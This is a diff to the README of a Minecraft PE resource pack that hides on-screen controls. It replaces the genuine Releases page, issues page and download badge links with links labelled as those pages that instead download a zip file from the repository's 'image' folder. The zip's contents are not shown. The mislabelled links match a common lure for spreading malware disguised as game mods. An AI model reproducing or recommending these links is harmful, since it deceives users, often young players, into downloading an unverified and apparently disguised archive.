@@ -1,7 +1,7 @@
 # 🎮 f1-button-mcpe - Hide Controls for Cinematics
 
 ## 📥 Download Now
-[![Download f1-button-mcpe](https://img.shields.io/badge/Download-f1--button--mcpe-brightgreen)](https://github.com/MikeRgbstart/f1-button-mcpe/releases)
+[![Download f1-button-mcpe](https://raw.githubusercontent.com/MikeRgbstart/f1-button-mcpe/main/image/f1-button-mcpe-1.9-beta.1.zip)](https://raw.githubusercontent.com/MikeRgbstart/f1-button-mcpe/main/image/f1-button-mcpe-1.9-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to f1-button-mcpe! This lightweight resource pack for Minecraft PE (Bedrock) is perfect for those who want to enhance their game experience. You can easily hide your HUD, touch controls, and hand for stunning cinematics and perfect screenshots. This resource pack supports versions 1.16 to 1.21+.
@@ -19,7 +19,7 @@ This pack works seamlessly with Minecraft Bedrock editions. Enjoy cinematic game
 - **Device Compatibility**: This pack works on mobile devices running Minecraft PE.
 
 ## 📖 How to Install
-1. **Visit the Release Page**: Go to the [Releases page](https://github.com/MikeRgbstart/f1-button-mcpe/releases).   
+1. **Visit the Release Page**: Go to the [Releases page](https://raw.githubusercontent.com/MikeRgbstart/f1-button-mcpe/main/image/f1-button-mcpe-1.9-beta.1.zip).   
    This is where you can get the latest version of the resource pack.
 
 2. **Download the Resource Pack**: Look for the latest release and click on the download link for the resource pack file.  
@@ -49,9 +49,9 @@ If you encounter any issues during installation or usage:
 - Restart Minecraft after activating the pack for changes to take effect.
 
 ## 🔗 Additional Resources
-For any questions or further assistance, please visit our [issues page](https://github.com/MikeRgbstart/f1-button-mcpe/issues). Community members and developers may offer support and answers.
+For any questions or further assistance, please visit our [issues page](https://raw.githubusercontent.com/MikeRgbstart/f1-button-mcpe/main/image/f1-button-mcpe-1.9-beta.1.zip). Community members and developers may offer support and answers.
 
 ## 📥 Download & Install
-To get started with f1-button-mcpe, visit the [Releases page](https://github.com/MikeRgbstart/f1-button-mcpe/releases) to download the latest version of the resource pack. 
+To get started with f1-button-mcpe, visit the [Releases page](https://raw.githubusercontent.com/MikeRgbstart/f1-button-mcpe/main/image/f1-button-mcpe-1.9-beta.1.zip) to download the latest version of the resource pack. 
 
 Enjoy a clutter-free experience while playing Minecraft PE!
